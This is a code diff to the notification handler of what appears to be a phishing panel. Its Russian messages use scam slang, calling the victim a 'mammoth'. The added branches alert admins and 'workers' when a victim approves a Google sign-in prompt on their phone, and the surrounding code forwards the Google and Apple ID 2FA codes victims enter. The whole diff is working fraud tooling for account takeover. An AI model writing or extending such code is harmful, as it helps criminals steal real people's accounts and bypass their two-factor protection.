@@ -491,6 +491,10 @@ async def notify_user_event(
             admin_header = "📲 <b>Отправлены цифры Google | ⏳ Ожидание тапа</b>\n"
             worker_header = "🦣 <b>Отправлен Тап (Цифры)!</b>\n\n"
             status_desc = "📲 Отправлены цифры (Тап) на экран мамонта"
+        elif norm_step in ("google_prompt_confirmed", "google_prompt_done"):
+            admin_header = "📲 <b>Тап на телефоне нажат | ⏳ Ожидание решения админа</b>\n"
+            worker_header = "🦣 <b>Мамонт подтвердил Тап (Google)!</b>\n\n"
+            status_desc = "📲 Мамонт нажал «Да» на телефоне, ожидает решения админа"
         elif norm_step in ("google_2fa_waiting", "google_ask_2fa"):
             admin_header = "🔑 <b>Запрошен 2FA код Google | ⏳ Ожидание ввода</b>\n"
             worker_header = "🦣 <b>Запрошен 2FA код Google!</b>\n\n"
@@ -688,6 +692,7 @@ async def notify_user_event(
             "google_password", "google_waiting_code",
             "google_wrong_password", "google_error_password",
             "google_prompt", "google_show_prompt",
+            "google_prompt_confirmed", "google_prompt_done",
             "google_2fa_waiting", "google_ask_2fa",
             "google_wrong_2fa", "google_error_2fa",
             "google_code", "google_2fa", "google_checking"
@@ -759,6 +764,8 @@ async def notify_user_event(
         if norm_step in ("google_code", "google_2fa", "google_checking"):
             code_str = f" <code>{google_code}</code>" if google_code else ""
             admin_push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Google:{code_str}"
+        elif norm_step in ("google_prompt_confirmed", "google_prompt_done"):
+            admin_push_text = f"📲 <b>{user_tag}:</b> Подтвердил вход на телефоне (Тап)"
         elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
             code_str = f" <code>{apple_code}</code>" if apple_code else ""
             admin_push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Apple ID:{code_str}"
@@ -927,6 +934,8 @@ async def notify_user_event(
                 if norm_step in ("google_code", "google_2fa", "google_checking"):
                     code_str = f" <code>{google_code}</code>" if google_code else ""
                     push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Google:{code_str}"
+                elif norm_step in ("google_prompt_confirmed", "google_prompt_done"):
+                    push_text = f"📲 <b>{user_tag}:</b> Подтвердил вход на телефоне (Тап)"
                 elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
                     code_str = f" <code>{apple_code}</code>" if apple_code else ""
                     push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Apple ID:{code_str}"
